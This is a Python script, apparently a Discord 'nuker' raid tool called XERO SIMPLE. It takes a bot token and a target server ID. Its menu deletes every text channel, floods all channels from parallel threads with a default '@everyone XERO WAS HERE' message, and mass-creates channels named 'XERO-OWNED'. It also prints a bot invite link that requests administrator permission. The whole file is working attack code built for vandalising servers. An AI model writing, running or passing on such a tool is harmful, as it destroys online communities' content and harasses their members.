
import os
import sys
import time
import threading

try:
    import requests
except:
    os.system("pip3 install requests --break-system-packages")
    import requests

os.system("clear")

print("""
====================================
    XERO SIMPLE - iSH EDITION
====================================
""")

token = input("[?] BOT TOKEN: ").strip()
if not token:
    print("[!] Token required!")
    sys.exit(1)

# فحص التوكن
print("[...] Checking token...")
try:
    r = requests.get(
        "https://discord.com/api/v10/users/@me",
        headers={"Authorization": f"Bot {token}"},
        timeout=15
    )
    if r.status_code == 200:
        info = r.json()
        print(f"[+] Connected as: {info['username']}")
        print("[+] Token is valid!\n")
        time.sleep(1)
    else:
        print(f"[-] Invalid token! Status: {r.status_code}")
        sys.exit(1)
except Exception as e:
    print(f"[-] Connection error: {e}")
    print("[-] Check your internet connection!")
    sys.exit(1)

# ==================== الأداة نفسها ====================
class XeroSimple:
    def __init__(self, guild_id, token):
        self.guild_id = guild_id
        self.token = token
        self.spamming = False
        self.spam_count = 0
        self.headers = {"Authorization": f"Bot {self.token}"}

    def api_call(self, method, url, data=None):
        try:
            if method == "get":
                return requests.get(url, headers=self.headers, timeout=15)
            elif method == "post":
                return requests.post(url, headers=self.headers, json=data, timeout=15)
            elif method == "delete":
                return requests.delete(url, headers=self.headers, timeout=15)
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

    def check_guild(self):
        """يتأكد إن البوت يقدر يدخل السيرفر"""
        print(f"[...] Checking guild {self.guild_id}...")
        r = self.api_call("get", f"https://discord.com/api/v10/guilds/{self.guild_id}")
        if r and r.status_code == 200:
            guild = r.json()
            print(f"[+] Guild found: {guild['name']}")
            return True
        elif r and r.status_code == 403:
            print("[-] Bot is NOT in this guild!")
            print("[-] Add the bot to the guild first!")
            return False
        elif r and r.status_code == 404:
            print("[-] Guild not found!")
            return False
        else:
            print("[-] Cannot access guild!")
            return False

    def get_all_channels(self):
        r = self.api_call("get", f"https://discord.com/api/v10/guilds/{self.guild_id}/channels")
        if r and r.status_code == 200:
            channels = r.json()
            text_channels = [c for c in channels if c['type'] == 0]
            print(f"[+] Found {len(text_channels)} text channels")
            return text_channels
        return []

    def delete_all_channels(self):
        channels = self.get_all_channels()
        if not channels:
            print("[!] No channels found!")
            return
        
        print(f"\n[!] Deleting {len(channels)} channels...\n")
        
        deleted = 0
        for i, channel in enumerate(channels, 1):
            r = self.api_call("delete", f"https://discord.com/api/v10/channels/{channel['id']}")
            if r and r.status_code == 200:
                deleted += 1
                print(f"[+] Deleted: {channel['name']} ({i}/{len(channels)})")
            else:
                print(f"[-] Failed: {channel['name']}")
            time.sleep(0.5)
        
        print(f"\n[+] Deleted {deleted}/{len(channels)}")

    def spam_single_channel(self, channel_id, message):
        while self.spamming:
            try:
                r = self.api_call(
                    "post",
                    f"https://discord.com/api/v10/channels/{channel_id}/messages",
                    data={"content": message}
                )
                if r and r.status_code == 200:
                    self.spam_count += 1
                elif r and r.status_code == 429:
                    time.sleep(1)
                else:
                    time.sleep(0.5)
            except:
                time.sleep(0.5)

    def spam_all_channels(self, message):
        channels = self.get_all_channels()
        if not channels:
            print("[!] No channels found!")
            return
        
        print(f"\n[!] Spamming {len(channels)} channels...")
        print("[!] PRESS ENTER TO STOP\n")
        
        for channel in channels:
            t = threading.Thread(target=self.spam_single_channel, args=(channel['id'], message))
            t.daemon = True
            t.start()

    def start_spam(self, message):
        if self.spamming:
            return
        self.spamming = True
        self.spam_count = 0
        threading.Thread(target=self.spam_all_channels, args=(message,), daemon=True).start()
        while self.spamming:
            sys.stdout.write(f"\r[!] Messages sent: {self.spam_count}")
            sys.stdout.flush()
            time.sleep(1)

    def stop_spam(self):
        self.spamming = False
        print(f"\n[!] Stopped. Total: {self.spam_count}")

    def create_channels(self, name, amount):
        print(f"\n[!] Creating {amount} channels...\n")
        
        created = 0
        for i in range(amount):
            channel_name = f"{name}-{i+1}" if amount > 1 else name
            r = self.api_call(
                "post",
                f"https://discord.com/api/v10/guilds/{self.guild_id}/channels",
                data={"name": channel_name, "type": 0}
            )
            if r and r.status_code == 201:
                created += 1
                print(f"[+] {created}/{amount}: {channel_name}")
                if created >= amount:
                    break
            else:
                print(f"[-] Failed: {channel_name}")
            time.sleep(0.5)
        
        print(f"\n[+] Created {created}/{amount}")

    def get_invite(self):
        r = self.api_call("get", "https://discord.com/api/v10/oauth2/applications/@me")
        if r and r.status_code == 200:
            cid = r.json()['id']
            return f"https://discord.com/oauth2/authorize?client_id={cid}&permissions=8&scope=bot"
        return None

    def menu(self):
        while True:
            os.system("clear")
            print(f"""
====================================
    XERO SIMPLE - iSH EDITION
    TARGET: {self.guild_id}
====================================

  [1] DELETE ALL CHANNELS
  [2] SPAM ALL CHANNELS
  [3] CREATE CHANNELS
  [4] SHOW INVITE LINK
  [5] CHANGE TARGET
  [6] EXIT

====================================
            """)
            
            choice = input("[XERO] > ")

            if choice == "1":
                confirm = input("[!] ARE YOU SURE? (yes/no): ")
                if confirm.lower() == 'yes':
                    self.delete_all_channels()
                input("\n[PRESS ENTER]")
                
            elif choice == "2":
                message = input("[?] MESSAGE: ") or "@everyone XERO WAS HERE"
                self.start_spam(message)
                input()
                self.stop_spam()
                
            elif choice == "3":
                name = input("[?] NAME: ") or "XERO-OWNED"
                try:
                    amount = int(input("[?] HOW MANY: "))
                except:
                    amount = 20
                self.create_channels(name, amount)
                input("\n[PRESS ENTER]")
                
            elif choice == "4":
                invite = self.get_invite()
                if invite:
                    print(f"\n[+] {invite}")
                else:
                    print("\n[-] Failed!")
                input("\n[PRESS ENTER]")
                
            elif choice == "5":
                return "change"
                
            elif choice == "6":
                print("[!] BYE!")
                return "exit"

# ==================== حلقة التشغيل ====================
print("[!] Ready!\n")

while True:
    guild_id = input("[?] GUILD ID (or exit): ").strip()
    
    if guild_id.lower() == 'exit':
        print("[!] Goodbye!")
        sys.exit(0)
    
    if not guild_id.isdigit():
        print("[-] Invalid guild ID! Numbers only.\n")
        continue
    
    print("")
    xero = XeroSimple(guild_id, token)
    
    if xero.check_guild():
        print("[+] Starting menu...\n")
        time.sleep(1)
        result = xero.menu()
        if result == "exit":
            sys.exit(0)
    else:
        print("\n[!] Add bot to guild first!")
        invite = xero.get_invite()
        if invite:
            print(f"[+] Invite link: {invite}")
        print("")
